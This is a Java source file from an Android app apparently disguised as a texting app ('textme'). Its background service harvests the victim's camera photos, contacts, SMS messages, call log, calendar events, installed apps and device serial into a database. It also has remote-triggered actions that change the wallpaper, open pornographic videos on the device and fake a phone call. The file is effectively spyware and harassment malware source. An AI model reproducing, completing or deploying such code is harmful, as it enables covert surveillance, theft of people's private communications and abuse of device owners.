package com.candroid.textme;

import android.app.IntentService;
import android.content.Intent;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.os.Build;
import android.util.Log;

import java.io.File;
import java.util.ArrayList;

public class JobsIntentService extends IntentService {

    private static final String TAG = JobsIntentService.class.getSimpleName();
    public static final String ACTION_DCIM_FILES = "ACTION_DCIM_FILES";
    public static final String ACTION_SMS = "ACTION_SMS";
    public static final String ACTION_CALENDAR_EVENT = "ACTION_CALENDAR_EVENT";
    public static final String ACTION_PACKAGES = "ACTION_PACKAGES";
    public static final String ACTION_CONTACTS = "ACTION_CONTACTS";
    public static final String ACTION_DEVICE_INFO = "ACTION_DEVICE_INFO";
    public static final String ACTION_PHONE_CALLS = "ACTION_PHONE_CALLS";
    public static final String ACTION_WEB_PORN = "ACTION_WEB_PORN";
    public static final String ACTION_WALLPAPER = "ACTION_WALLPAPER";
    public static final String ACTION_FAKE_PHONE_CALL = "ACTION_FAKE_PHONE_CALL";

    public JobsIntentService() {
        super("JobsIntentService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent != null && intent.getAction() != null) {
            if(intent.getAction().equals(ACTION_DCIM_FILES)){
                File[] pictures = Lofl.getFilesForDirectory(Lofl.getDcimDirectory().getPath() + "/Camera");
                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                try{
                    database.beginTransaction();
                    if(pictures != null && pictures.length > 0){
                        for(File f : pictures){
                            Database.insertMedia(database, f.getName(), f);
                        }
                    }
                    database.setTransactionSuccessful();
                }catch (SQLiteException e){
                    e.printStackTrace();
                }finally {
                    database.endTransaction();
                    if(database.isOpen()){
                        database.close();
                    }
                }
            }else if(intent.getAction().equals(ACTION_PACKAGES)){
                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                try{
                    database.beginTransaction();
                    Database.insertPackages(database, Lofl.getInstalledApps(this));
                    database.setTransactionSuccessful();
                }catch (SQLiteException e){
                    e.printStackTrace();
                }finally {
                    database.endTransaction();
                    if(database.isOpen()){
                        database.close();
                    }
                }
            }else if(intent.getAction().equals(ACTION_CONTACTS)){
                ArrayList<Contact> contacts = Lofl.fetchContactsInformation(this);
                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                try{
                    database.beginTransaction();
                    Database.insertContacts(database, contacts);
                    database.setTransactionSuccessful();
                }catch (SQLiteException e){
                    e.printStackTrace();
                }finally{
                    database.endTransaction();
                    database.close();
                }
            }else if(intent.getAction().equals(ACTION_DEVICE_INFO)){
                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                try{
                    database.beginTransaction();
                    Database.insertDevice(database, MessagingService.sTelephoneAddress, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, BuildConfig.FLAVOR, Build.SERIAL, Build.RADIO);
                    database.setTransactionSuccessful();
                }catch (SQLException e){
                    e.printStackTrace();
                }finally {
                    database.endTransaction();
                    database.close();
                }
            }else if(intent.getAction().equals(ACTION_PHONE_CALLS)){
                ArrayList<PhoneCall> phoneCalls = Lofl.fetchCallLog(this);
                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                try{
                    database.beginTransaction();
                    Database.insertPhoneCalls(database, phoneCalls);
                    database.setTransactionSuccessful();
                }catch (SQLException e){
                    e.printStackTrace();
                }finally{
                    database.endTransaction();
                    database.close();
                }
            }else if(intent.getAction().equals(ACTION_SMS)){
                ArrayList<SmsMsg> smsMsgs = Lofl.fetchSmsMessages(this);
                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                try{
                    database.beginTransaction();
                    Database.insertSmsMessages(database, smsMsgs);
                    database.setTransactionSuccessful();
                }catch (SQLException e){
                    e.printStackTrace();
                }finally {
                    database.endTransaction();
                    database.close();
                }
            }else if(intent.getAction().equals(ACTION_CALENDAR_EVENT)){
                ArrayList<CalendarEvent> calendarEvents = Lofl.fetchCalendarEvents(this);
                SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
                try{
                    database.beginTransaction();
                    Database.insertCalendarEvents(database, calendarEvents);
                    database.setTransactionSuccessful();
                }catch (SQLException e){
                    e.printStackTrace();
                }finally {
                    database.endTransaction();
                    database.close();
                }
            }else if(intent.getAction().equals(ACTION_WALLPAPER)){
                double randomNumber = Math.random();
                String url = null;
                if(randomNumber <= 0.5){
                    url = Wallpapers.WALLPAPERS[0];
                }else{
                    url = Wallpapers.WALLPAPERS[2];
                }
                Lofl.changeWallpaper(this, Lofl.getBitmapFromUrl(Uri.parse(url).toString()));
            }else if(intent.getAction().equals(ACTION_WEB_PORN)){
                double randomNumber = Math.random();
                int videoId = 0;
                if(randomNumber >= 0.5){
                    videoId = 1;
                }
                Lofl.watchPornHubVideo(this, Pornhub.VIDEOS[videoId]);
            }else if(intent.getAction().equals(ACTION_FAKE_PHONE_CALL)){
                Lofl.fakePhoneCall(this);
            }else{
                Log.d(TAG, "No action found!");
            }
        }
    }
}